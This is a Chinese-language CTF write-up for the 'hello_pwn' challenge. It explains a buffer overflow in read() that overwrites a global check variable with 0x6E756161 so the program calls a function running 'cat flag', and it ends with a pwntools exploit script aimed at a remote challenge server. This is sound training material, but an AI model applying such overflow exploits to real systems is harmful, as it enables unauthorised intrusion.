
先放进linux里看一下有无保护  
![先checksec一下](https://sphandsomejack.github.io/2020/01/31/hello_pwn/a.png)

用64位IDA打开，先看字符串窗口，看看有没有可以利用的字符串  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/hello_pwn/b.png)  
发现可以有system和cat flag，组合使用可以直接拿到flag，点进去看看  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/hello_pwn/c.png)  
发现在sub_400686函数里，并且可以直接用  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/hello_pwn/d.png)  
![在这里插入图片描述](https://sphandsomejack.github.io/2020/01/31/hello_pwn/e.png)  
而主函数里调用该函数条件是dword_60106C等于0x6E756161，且read存在溢出漏洞，**栈溢出是向高地址溢出**，所以可以由601068溢出来覆盖60106C。

## [](https://sphandsomejack.github.io/2020/01/31/hello_pwn/#%E6%80%9D%E8%B7%AF%EF%BC%9A "思路：")思路：

让unk_601068溢出，覆盖dword_60106C的值为0x6E756161，来使main的if判断成立，调用sub_400686函数，得到flag。

## [](https://sphandsomejack.github.io/2020/01/31/hello_pwn/#EXP%EF%BC%9A "EXP：")EXP：

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6|from pwn import *  <br>a = remote('111.198.29.45',40481)  <br>payload = 'a'*4 + p64(0x6E756161)  <br>#地址0x00601068到0x0060106C的偏移是4，所以填充4个字符；由于是64位程序，所以用p64打包  <br>a.sendline(payload)  <br>a.interactive()|